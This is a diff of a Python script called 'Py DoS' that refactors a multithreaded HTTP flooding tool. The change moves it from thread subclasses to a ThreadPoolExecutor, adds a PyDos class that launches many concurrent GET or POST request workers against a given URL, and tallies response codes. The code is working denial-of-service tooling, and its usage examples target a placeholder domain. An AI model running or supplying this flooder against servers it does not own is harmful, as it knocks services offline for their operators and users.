@@ -1,8 +1,8 @@
 '''
 Author: kaneda (kanedasan@gmail.com)
-Date: February 9th 2016
+Date: March 31st 2016
 Description: Py DoS
-Requires: pycurl
+Requires: pycurl, Python3
 
 Copyright (c) 2016 kaneda (http://jbegleiter.com)
 All rights reserved.
@@ -30,19 +30,19 @@ SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 Don't be evil.
 '''
 
+import concurrent.futures
 import io
 import getopt
 import pycurl
 from random import random
 import socket
 import sys
-import threading
 import time
 import urllib.error
 import urllib.parse
 import urllib.request
 
-class HttpDos(threading.Thread):
+class HttpDos():
     def __init__(self, url, method = 'GET', http_timeout = 0.5, time_limit = 600, payload = None, verbose = False):
         super(HttpDos, self).__init__()
 
@@ -108,11 +108,102 @@ class HttpDos(threading.Thread):
                 current_time = time.time()
 
                 if self.verbose and self.num_requests % 1000 == 0:
-                    print("Sent {0} requests on thread {1} in {2} seconds".format(self.num_requests, self.ident, current_time - start_time))
+                    print("Sent {0} requests on thread in {1} seconds".format(self.num_requests, current_time - start_time))
+
+        return {
+            "num_requests": self.num_requests,
+            "num_errors": self.num_errors,
+            "code_map": self.code_map
+        }
 
     def run(self):
-        print("Starting run on thread {0}".format(self.ident))
-        self.testHttpTimeout()
+        print("Starting run")
+        return self.testHttpTimeout()
+
+class PyDos():
+    def __init__(self, num_threads, url, http_method, http_timeout, time_to_run, verbose = False):
+        self.payload = self.get_payload(url, http_method)
+        self.num_threads = num_threads
+        self.url = url
+        self.http_method = http_method
+        self.http_timeout = http_timeout
+        self.time_to_run = time_to_run
+        self.verbose = verbose
+
+        self.print_init_values()
+
+        self.error_map      = {}
+        self.total_errors   = 0
+        self.total_requests = 0
+
+        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=num_threads)
+
+    def print_init_values(self):
+        print("URL: {0}".format(self.url))
+        print("Method: {0}".format(self.http_method))
+        print("Payload: {0}".format(self.payload))
+        print("HTTP Timeout: {0}".format(self.http_timeout))
+        print("Time limit: {0}".format(self.time_to_run))
+        print("Num threads: {0}".format(self.num_threads))
+        print("Verbose mode: {0}".format("on" if self.verbose else "off"))
+
+    def get_payload(self, url, method = 'GET'):
+        payload = None
+        if method == 'POST':
+            c_url, args = url.split('?')
+
+            if args:
+                payload = {}
+                params = args.split('&')
+
+                for param in params:
+                    key, *value = param.split('=')
+                    if len(value) > 1:
+                        value = '='.join(value)
+                    else:
+                        value = ''.join(value)
+
+                    payload[key] = ''.join(value)
+
+        return payload
+
+    def exec_dos(self):
+        http_objects = list()
+
+        for i in range(self.num_threads):
+            http_objects.append(HttpDos(
+                self.url,
+                self.http_method,
+                self.http_timeout,
+                self.time_to_run,
+                self.payload,
+                self.verbose
+            ))
+
+        # Start the load operations and mark each future with its URL
+        future_to_url = [ self.executor.submit(http_object.run) for http_object in http_objects ]
+        for future in concurrent.futures.as_completed(future_to_url):
+            try:
+                data = future.result()
+            except Exception as exc:
+                print('generated an exception: %s' % (exc))
+            else:
+                self.total_requests += data['num_requests']
+                self.total_errors += data['num_errors']
+                for k in data["code_map"].keys():
+                    if k in self.error_map:
+                        self.error_map[k] += data["code_map"][k]
+                    else:
+                        self.error_map[k] = data["code_map"][k]
+
+        self.print_results()
+
+    def print_results(self):
+        print("All done!")
+        print("Total requests sent: {0}".format(self.total_requests))
+        print("Error map received:\n{0}".format(self.error_map))
+        print("Total errors received:\n{0}".format(self.total_errors))
+
 
 def usage():
     print("pydos.py help\n")
@@ -129,26 +220,6 @@ def usage():
     print("python pydos.py -u https://yourdomain.com/somepath --method=POST                   # Run POST calls")
     print("python pydos.py -u https://yourdomain.com/somepath --verbose                       # Enable verbose mode")
     print("python pydos.py -u https://yourdomain.com/somepath?somearg=somevalue --method=POST # Run POST called against endpoint with payload somearg=somevalue")
-
-def get_payload(url, method = 'GET'):
-    payload = None
-    if method == 'POST':
-        c_url, args = url.split('?')
-
-        if args:
-            payload = {}
-            params = args.split('&')
-
-            for param in params:
-                key, *value = param.split('=')
-                if len(value) > 1:
-                    value = '='.join(value)
-                else:
-                    value = ''.join(value)
-
-                payload[key] = ''.join(value)
-
-    return payload
 
 def main():
     try:
@@ -180,7 +251,7 @@ def main():
             try:
                 num_threads = int(argument)
 
-                if(num_threads < 1): raise Exception('yikes')
+                if(num_threads < 1): raise Exception('You must specify at least one thread')
             except Exception:
                 num_threads = 1
                 print("Not a valid number of threads (must be at least 1), using 1 instead")
@@ -188,7 +259,7 @@ def main():
             try:
                 http_timeout = float(argument)
 
-                if http_timeout < 0.1: raise Exception('yikes')
+                if http_timeout < 0.1: raise Exception('Timeout cannot be less than 0.1 seconds')
             except Exception:
                 http_timeout = 0.5
                 print("Not a valid http timeout (must be at least 0.1), using 0.5 instead")
@@ -211,43 +282,11 @@ def main():
             usage()
             sys.exit()
 
-    payload = get_payload(url, http_method)
+    if url is None:
+        print("You must specify a URL endpoint")
+        sys.exit(1)
 
-    print("URL: {0}".format(url))
-    print("Method: {0}".format(http_method))
-    print("Payload: {0}".format(payload))
-    print("HTTP Timeout: {0}".format(http_timeout))
-    print("Time limit: {0}".format(time_to_run))
-    print("Num threads: {0}".format(num_threads))
-    print("Verbose mode: {0}".format("on" if verbose else "off"))
+    pydos_obj = PyDos(num_threads, url, http_method, http_timeout, time_to_run, verbose)
+    pydos_obj.exec_dos()
 
-    http_job_list  = []
-    error_map      = {}
-    total_errors   = 0
-    total_requests = 0
-
-    for i in range(num_threads):
-        http_job_list.append(HttpDos(url, http_method, http_timeout, time_to_run, payload, verbose))
-
-    for j in http_job_list:
-        j.start()
-
-    for j in http_job_list:
-        j.join()
-
-        for k in j.code_map.keys():
-            if k in error_map:
-                error_map[k] += j.code_map[k]
-            else:
-                error_map[k] = j.code_map[k]
-
-        total_requests += j.num_requests
-        total_errors   += j.num_errors
-
-    print("All done!")
-    print("Total requests sent: {0}".format(total_requests))
-    print("Error map received:\n{0}".format(error_map))
-    print("Total errors received:\n{0}".format(total_errors))
-
-main()
-
+if __name__ == "__main__": main()
